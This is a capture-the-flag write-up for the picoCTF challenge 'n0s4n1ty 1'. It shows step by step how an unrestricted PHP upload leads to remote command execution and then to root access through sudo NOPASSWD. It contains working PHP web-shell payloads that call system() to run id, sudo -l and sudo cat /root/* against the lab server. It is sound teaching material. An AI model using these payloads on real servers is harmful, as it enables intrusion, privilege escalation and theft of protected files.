Step 1 — Inspect the application
Open:
http://standard-pizzas.picoctf.net:50288/
It is a profile-picture upload page.

Step 2 — Create a harmless PHP proof-of-execution
Create a php file with name test.php
```php
<?php
echo "PHP_EXECUTION_CONFIRMED";
?>
```
Now upload test.php through the challenge's Upload Profile form.
Then visit:
http://standard-pizzas.picoctf.net:50288/uploads/test.php
If the browser displays:
"PHP_EXECUTION_CONFIRMED"
we have confirmed: 
PHP execution. That means we've crossed the main vulnerability boundary:

Upload arbitrary PHP
        ↓
Server accepts it
        ↓
Server executes it
        ↓
Remote Command Execution

Step 3 — Verify command execution
Replace the contents of test.php with:
```php
<?php
echo "<pre>";
system("whoami");
system("id");
echo "</pre>";
?>
```
Upload it again, then visit the uploaded file.
We expect something like:
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Step 4 — Check entering root mode

Once command execution works, change the PHP payload to:
```php
<?php
echo "<pre>";
system("sudo -l");
echo "</pre>";
?>
```
Upload it and open the resulting .php URL.
You may see:
Matching Defaults entries for www-data on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
This means there is no password required for Root.

Step 5 — Become root

Since our PHP RCE already gives us command execution as www-data, we can invoke sudo from PHP.

Use:
```php
<?php
echo "<pre>";
system("sudo -i whoami");
echo "</pre>";
?>
```
Upload it and open the resulting PHP file.
We want to see:
root

Step 6 — Read /root

Once root is confirmed, use:
```php
<?php
echo "<pre>";
system("sudo cat /root/*");
echo "</pre>";
?>
```
If there are multiple files in /root, a cleaner enumeration is:
```php
<?php
echo "<pre>";
system("sudo ls -la /root");
echo "</pre>";
?>
```
Then target the flag file specifically:
```php
<?php
echo "<pre>";
system("sudo cat /root/flag.txt");
echo "</pre>";
?>
```
Attack chain we've established:

Final exploit chain
Found the upload functionality
upload.php
Parameter: fileToUpload
Uploaded a PHP file
Server accepted the .php file.
Visiting the uploaded file confirmed PHP execution.
Achieved command execution
Executed commands as www-data.

Ran sudo -l

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
Privilege escalation
www-data could execute anything as root without authentication.

Retrieved the flag

/root/flag.txt
Vulnerability chain
Unrestricted File Upload
        ↓
PHP Code Execution
        ↓
Remote Command Execution
        ↓
www-data
        ↓
sudo NOPASSWD: ALL
        ↓
Root
        ↓
/root/flag.txt

The key lesson from n0s4n1ty 1 is that an upload vulnerability becomes critical RCE when the server allows executable server-side files into a web-accessible directory. The second vulnerability—www-data having unrestricted sudo privileges—then turns that RCE into full root compromise.